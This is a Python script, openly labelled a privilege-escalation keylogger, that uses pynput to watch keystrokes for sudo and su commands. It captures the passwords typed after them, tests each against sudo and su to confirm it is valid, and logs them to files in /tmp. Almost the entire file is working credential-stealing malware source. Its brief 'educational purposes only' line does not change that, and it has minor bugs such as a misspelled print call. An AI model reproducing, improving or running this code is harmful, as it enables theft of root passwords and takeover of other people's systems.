#!/usr/bin/env python3
"""
Privilege Escalation Module: Keylogger for Capturing Root Passwords

This script implements a keylogger that detects 'sudo' and 'su' commands,
captures subsequent password inputs, and logs them. It supports capturing
multiple password attempts (up to 3 per command).

Key Features:
- Detects password-prompting commands (sudo, su).
- Captures passwords entered after command detection.
- Handles multiple attempts with a limit.
- Logs full keystrokes and extracted passwords separately.
- Verifies captured passwords using sudo authentication check.
- Rotates log files when they exceed a size limit.

Security Note: This is for educational purposes only. Keyloggers can be
malicious; use responsibly and ethically.

Dependencies: pynput, subprocess, os, sys, time, datetime, re
"""

import os
import sys
import time
import datetime
import re
from pynput import keyboard
import subprocess
import pexpect


# Configuration Constants
LOG_FILE = "/tmp/keylog.txt"
PASSWORD_FILE = "/tmp/passwords.txt"
MAX_FILE_SIZE = 1024 * 1024  # 1 MB
MAX_PASSWORD_ATTEMPTS = 3


class PasswordDetector:
    """
    Class to detect and capture passwords from keyboard inputs,
    specifically targeting sudo/su commands.
    """

    def __init__(self):
        """
        Initialize the PasswordDetector with empty buffers and flags.
        """
        self.buffer = []  # Buffer for password characters
        self.command_buffer = []  # Buffer for command characters
        self.expecting_password = False  # Flag for password capture mode
        self.password_context = ""  # Detected command context
        self.password_attempts = 0  # Counter for password attempts
        self.is_root = os.geteuid() == 0  # Check if running as root
        self.captured_passwords = []  # List to store captured password info
        self.has_nopasswd = self.check_sudo_nopasswd()

        if self.is_root:
            print("Warning: Running as root, password verification may be skipped.")
        if self.has_nopasswd:
            print("Warning: NOPASSWD detected in sudo configuration, password verification will be unreliable.")

    def get_captured_passwords(self):
        """Return the list of captured passwords."""
        return self.captured_passwords

    def clear_captured_passwords(self):
        """Clear the list of captured passwords."""
        self.captured_passwords = []

    def process_key(self, key, timestamp):
        """
        Process each key press for command detection and password capture.

        Args:
            key: The key pressed (from pynput).
            timestamp: Current timestamp string.
        """
        # Get key representation for command detection
        key_char_command = self._get_key_char_for_command(key)

        if key_char_command:
            self.command_buffer.append(key_char_command)

        # Handle ENTER key
        if key == keyboard.Key.enter:
            current_command = self._clean_command_buffer()

            if not self.expecting_password:
                # Check for password command on first ENTER
                if self._is_password_command(current_command):
                    self.expecting_password = True
                    self.password_context = current_command
                    self.buffer = []  # Start fresh for password
                    self.password_attempts = 0  # Reset attempts
                    print(f"[!] Detected password command: {current_command}")
                    print("[!] Now capturing password until next ENTER...")
            else:
                # Capture password on subsequent ENTER
                self._capture_password(timestamp)

            # Reset command buffer after ENTER
            self.command_buffer = []

        # Capture keys for password if in expecting mode
        elif self.expecting_password:
            key_char_password = self._get_key_char_for_password(key)
            if key_char_password is not None:
                if key_char_password == 'BACKSPACE' and self.buffer:
                    self.buffer.pop()
                elif key_char_password not in ['ENTER', 'ESC', 'CTRL']:
                    if len(key_char_password) == 1 or key_char_password == ' ':
                        self.buffer.append(key_char_password)
            elif key in (keyboard.Key.esc, keyboard.Key.ctrl):
                # Cancel password input
                self.expecting_password = False
                self.buffer = []
                print("[!] Password input cancelled")

    def _get_key_char_for_command(self, key):
        """Return descriptive string for command detection and logging."""
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif key == keyboard.Key.space:
            return 'SPACE'
        elif key == keyboard.Key.enter:
            return 'ENTER'
        elif key == keyboard.Key.backspace:
            return 'BACKSPACE'
        elif key == keyboard.Key.tab:
            return 'TAB'
        elif key == keyboard.Key.shift:
            return 'SHIFT'
        elif key == keyboard.Key.ctrl:
            return 'CTRL'
        elif key == keyboard.Key.alt:
            return 'ALT'
        elif key == keyboard.Key.cmd:
            return 'CMD'
        elif key == keyboard.Key.esc:
            return 'ESC'
        else:
            return str(key).split('.')[-1].upper()

    def _get_key_char_for_password(self, key):
        """Return actual characters for password capture."""
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif key == keyboard.Key.space:
            return ' '
        elif key == keyboard.Key.backspace:
            return 'BACKSPACE'
        elif key == keyboard.Key.enter:
            return 'ENTER'
        elif key == keyboard.Key.esc:
            return 'ESC'
        elif key == keyboard.Key.ctrl:
            return 'CTRL'
        return None

    def _clean_command_buffer(self):
        """Clean command buffer for pattern matching."""
        cleaned = []
        for item in self.command_buffer:
            if item == 'SPACE':
                cleaned.append(' ')
            elif item == 'TAB':
                cleaned.append(' ')
            elif len(item) == 1:
                cleaned.append(item)
            # Ignore other special keys
        return ''.join(cleaned).strip().lower()

    def _is_password_command(self, command):
        """Check if command requires password."""
        password_patterns = [
            r'^sudo\s+su$',       # sudo su
            r'^sudo\s+su\s+',     # sudo su [options]
            r'^sudo\s+[a-z]',     # sudo [command]
            r'^su$',              # su
            r'^su\s+',            # su [options]
        ]
        return any(re.match(pattern, command) for pattern in password_patterns)



    
    def check_sudo_nopasswd(self) -> bool:
        """
        Check if sudo is configured with NOPASSWD for the current user.

        Returns:
            bool: True if sudo runs without a password, False otherwise.
        """
        print('verify nopass func')
        try:
            result = subprocess.run(
                ["sudo", "-n", "true"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=2
            )
            if result.returncode == 0:
                prin('No pass detected')
                return True
            return False
        except subprocess.SubprocessError:
            return False
        except Exception as e:
            print(f"Error checking NOPASSWD: {e}")
            return False

    def verify__password(self, password: str) -> bool:

        print('verify password func')
        """
        Verify if the provided password is correct for root access.

        Args:
            password: The password to verify.

        Returns:
            bool: True if the password is correct, False otherwise.
        """
        if self.is_root:
            print("Running as root: No password verification needed.")
            return True  # Root doesn't need sudo password
        if self.has_nopasswd:
            print("NOPASSWD detected: Password verification is unreliable.")
            return False  # Avoid misleading results

        try:
            # Invalidate sudo credential cache
            subprocess.run(["sudo", "-K"], check=True)

            # Run sudo command to test password
            proc = subprocess.Popen(
                ["sudo", "-S", "true"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = proc.communicate(input=password + "\n", timeout=5)

            if proc.returncode == 0:
                print(f"[+] Correct sudo password: {password}")
                return True
            elif "incorrect password" in stderr.lower():
                print(f"[-] Incorrect sudo password: {password}")
                return False
            else:
                print(f"Unexpected sudo error: {stderr.strip()}")
                return False

        except subprocess.TimeoutExpired:
            print("Password verification timed out")
            return False
        except subprocess.SubprocessError as e:
            print(f"Error verifying password: {e}")
            return False
        except Exception as e:
            print(f"Unexpected error: {e}")
            return False

    def su_password(self, password):
        """
        Verify if the provided password is correct for root access via 'su'.

        Args:
            password: The password to verify.

        Returns:
            bool: True if the password is correct, False otherwise.
        """

        try:
            # Spawn su process with explicit options for better compatibility
            child = pexpect.spawn("su - root", encoding='utf-8', logfile=None, timeout=15)
            
            # Expect password prompt with broader patterns
            index = child.expect([
                r"[Pp]assword\s*:.*", 
                r"[Pp]assw[oO]rd.*:", 
                r"密碼.*:",  # For Chinese systems
                pexpect.EOF, 
                pexpect.TIMEOUT
            ], timeout=10)
            
            if index not in [0, 1, 2]:  # Not a password prompt
                if index == 3:
                    print("Unexpected EOF before password prompt")
                else:
                    print("Timeout waiting for password prompt")
                return False

            # Send the password
            child.sendline(password)
            
            # Wait briefly for authentication to process
            time.sleep(0.3)
            
            # Check multiple possible outcomes
            try:
                index = child.expect([
                    r"#\s*$",                    # Root prompt (success)
                    r"root@.*#",                 # Root prompt with hostname
                    r"Last login.*",             # Login message followed by prompt
                    r"[Aa]uthentication failure",
                    r"[Ii]ncorrect password",
                    r"[Ss]orry.*[Tt]ry.*again",
                    r"su: Authentication failure",
                    r"su: Sorry",
                    pexpect.EOF,
                    pexpect.TIMEOUT
                ], timeout=8)
                
                if index in [0, 1, 2]:  # Success patterns
                    print(f"[+] Correct SU password: {password}")
                    child.sendline("exit")
                    child.expect(pexpect.EOF, timeout=5)
                    return True
                elif index in [3, 4, 5, 6, 7]:  # Failure patterns
                    print(f"[-] Incorrect SU password: {password}")
                    return False
                elif index == 8:  # EOF
                    # EOF could mean success (immediate shell) or failure
                    # Try to see if process is still alive
                    if child.isalive():
                        # Process still running - likely success
                        child.sendline("whoami")
                        try:
                            child.expect("root", timeout=3)
                            print(f"[+] Correct SU password: {password}")
                            child.sendline("exit")
                            child.expect(pexpect.EOF, timeout=5)
                            return True
                        except:
                            print(f"[-] Incorrect SU password: {password}")
                            return False
                    else:
                        print(f"[-] Incorrect SU password: {password}")
                        return False
                else:  # Timeout
                    # Timeout might mean success but slow system
                    if child.isalive():
                        child.sendline("whoami")
                        try:
                            child.expect("root", timeout=3)
                            print(f"[+] Correct SU password: {password}")
                            child.sendline("exit")
                            child.expect(pexpect.EOF, timeout=5)
                            return True
                        except:
                            print(f"[-] Incorrect SU password: {password}")
                            return False
                    else:
                        print(f"[-] Incorrect SU password: {password}")
                        return False
                        
            except pexpect.exceptions.TIMEOUT:
                # Handle timeout in the inner expect
                if child.isalive():
                    child.sendline("whoami")
                    try:
                        child.expect("root", timeout=3)
                        print(f"[+] Correct SU password: {password}")
                        child.sendline("exit")
                        child.expect(pexpect.EOF, timeout=5)
                        return True
                    except:
                        print(f"[-] Incorrect SU password: {password}")
                        return False
                else:
                    print(f"[-] Incorrect SU password: {password}")
                    return False

        except pexpect.exceptions.TIMEOUT:
            print("Password verification timed out")
            return False
        except pexpect.exceptions.EOF:
            print("Unexpected EOF during password verification")
            return False
        except Exception as e:
            print(f"Error verifying password: {e}")
            return False
        finally:
            if 'child' in locals():
                child.close()

    def _capture_password(self, timestamp):
        """Capture and process the password from buffer."""
        if self.buffer:
            # Filter actual characters
            actual_chars = [char for char in self.buffer if char not in ['BACKSPACE', 'ENTER', 'ESC', 'CTRL']]
            if actual_chars:
                password = ''.join(actual_chars)
                self.password_attempts += 1

                # Verify password
                is_correct_sudo_pass = self.verify__password(password)
                is_correct_su_pass = self.su_password(password)

                # Store captured info
                self.captured_passwords.append({
                    'timestamp': timestamp,
                    'attempt': self.password_attempts,
                    'context': self.password_context,
                    'password': password,
                    'correct-sudo': is_correct_sudo_pass,
                    'correct-su': is_correct_su_pass
                })

                # Log to file
                with open(PASSWORD_FILE, "a") as f:
                    f.write(f"[{timestamp}] ATTEMPT #{self.password_attempts}: {self.password_context}\n")
                    f.write(f"[{timestamp}] PASSWORD: {password}\n")
                    f.write(f"[{timestamp}] CORRECT-SUDO: {is_correct_sudo_pass}\n")
                    f.write(f"[{timestamp}] CORRECT-SU: {is_correct_su_pass}\n")
                    f.write(f"[{timestamp}] {'-'*50}\n")

                print(f"[!] Password attempt #{self.password_attempts} captured: '{password}'")
            else:
                # Empty password
                self.password_attempts += 1
                self.captured_passwords.append({
                    'timestamp': timestamp,
                    'attempt': self.password_attempts,
                    'context': self.password_context,
                    'password': '[EMPTY_PASSWORD]',
                    'correct': False,
                    'correct-su': False
                })
                with open(PASSWORD_FILE, "a") as f:
                    f.write(f"[{timestamp}] ATTEMPT #{self.password_attempts}: {self.password_context}\n")
                    f.write(f"[{timestamp}] PASSWORD: [EMPTY_PASSWORD]\n")
                    f.write(f"[{timestamp}] CORRECT: False\n")
                    f.write(f"[{timestamp}] {'-'*50}\n")
                print("[!] Empty password detected!")

            # Check attempt limit
            if self.password_attempts >= MAX_PASSWORD_ATTEMPTS:
                print("[!] Reached max password attempts, resetting...")
                self.expecting_password = False
                self.password_attempts = 0
            elif is_correct_sudo_pass or is_correct_su_pass:
                print("[!] find valid passwords , restart from 0 attempt...")
                self.expecting_password = False
                self.password_attempts = 0
            else:
                print("[!] Ready for next password attempt...")

        self.buffer = []  # Reset buffer


def on_press(key, password_detector):
    """
    Callback for key press events.

    Args:
        key: The key pressed.
        password_detector: Instance of PasswordDetector.
    """
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Process for password detection
        password_detector.process_key(key, timestamp)

        # Log the key press
        key_char = password_detector._get_key_char_for_command(key)
        log_entry = f"{timestamp} - {key_char or '[UNKNOWN_KEY]'}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        # Rotate log if too large
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_FILE_SIZE:
            rotate_log_file()

    except Exception as e:
        print(f"Error in on_press: {e}")


def rotate_log_file():
    """Rotate the log file by renaming it with a timestamp."""
    if os.path.exists(LOG_FILE):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = f"{LOG_FILE}.{timestamp}"
        os.rename(LOG_FILE, backup_file)
        print(f"[!] Log file rotated to: {backup_file}")


def main():
    """
    Main function to start the keylogger.
    """
    print("Multi-Password Capture Keylogger started.")
    print("Pattern: COMMAND → ENTER → [PASSWORD] → ENTER (multiple attempts)")
    print(f"Will capture up to {MAX_PASSWORD_ATTEMPTS} password attempts per command")
    print(f"Full log: {LOG_FILE}")
    print(f"Passwords: {PASSWORD_FILE}")

    if not os.path.exists(os.path.dirname(LOG_FILE)):
        os.makedirs(os.path.dirname(LOG_FILE))

    password_detector = PasswordDetector()

    listener = keyboard.Listener(on_press=lambda key: on_press(key, password_detector))

    try:
        listener.start()
        print("[+] Keylogger is running. Press Ctrl+C to stop.")
        listener.join()
    except KeyboardInterrupt:
        print("\n[-] Stopping keylogger...")
    except Exception as e:
        print(f"Error in main: {e}")
    finally:
        listener.stop()

    # Display captured passwords
    passwords = password_detector.get_captured_passwords()
    if passwords:
        print("\n[+] Captured passwords:")
        for i, pw_info in enumerate(passwords, 1):
            print(f"{i}. Time: {pw_info['timestamp']}")
            print(f"   Context: {pw_info['context']}")
            print(f"   Password: '{pw_info['password']}'")
            print(f"   Correct: {pw_info['correct']}")
            print()
    else:
        print("\n[-] No passwords captured")

    return passwords


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Warning: Running without root privileges may limit key capture capabilities.")
    main()
